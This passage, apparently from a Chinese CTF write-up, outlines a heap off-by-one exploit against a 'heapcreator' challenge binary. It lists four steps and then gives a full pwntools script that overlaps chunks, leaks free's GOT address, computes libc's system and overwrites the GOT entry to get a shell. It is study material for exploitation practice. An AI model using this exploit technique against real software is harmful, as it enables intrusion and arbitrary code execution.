接下来简单说一下利用的思路：

  • 1.首先创建两个堆块：chunk0和chunk1。
  • 2.利用edit先将/bin/sh写入，在通过里面的off-by-one来将chunk1的size修改。
  • 3.malloc一个新的chunk2，使其落在chunk1的位置，之后修改content内容，利用show功能泄露出free的got表地址。
  • 4.将free的got表修改为system，delet（chunk0）达到目的

最后附上exp脚本： 

from pwn import *
context(os='linux' , arch = 'amd64' , log_level= 'debug')
p=process('./heapcreator')
def debug(msg=''):
    gdb.attach(p,'')
    pause()
elf=ELF('./heapcreator')
libc=elf.libc
free_got=elf.got['free']
free_libc=libc.symbols['free']
system_libc=libc.symbols['system']
def create(size,content):
    p.recvuntil('Your choice :')
    p.sendline('1')
    p.recvuntil('Size of Heap :')
    p.sendline(str(size))
    p.recvuntil('Content of heap:')
    p.send(content)
def edit(index,content):
    p.recvuntil('Your choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(index))
    p.recvuntil('Content of heap : ')
    p.send(content)
def show(index):
    p.recvuntil('Your choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index))
def delete(index):
    p.recvuntil('Your choice :')
    p.sendline('4')
    p.recvuntil('Index :')
    p.sendline(str(index))
#debug()
create(0x18,'a'*8)
create(0x10,'b'*8)
edit(0,'/bin/sh\x00'+'a'*0x10+p64(0x41))
delete(1)
create(0x30,p64(0)*4+p64(0x30)+p64(free_got))
show(1)
p.recvuntil('Content : ')
free=u64(p.recv(6).ljust(8,'\x00'))
libc_base=free-free_libc
system=system_libc+libc_base
print 'system:'+hex(system)
edit(1,p64(system))
delete(0)
p.interactive()
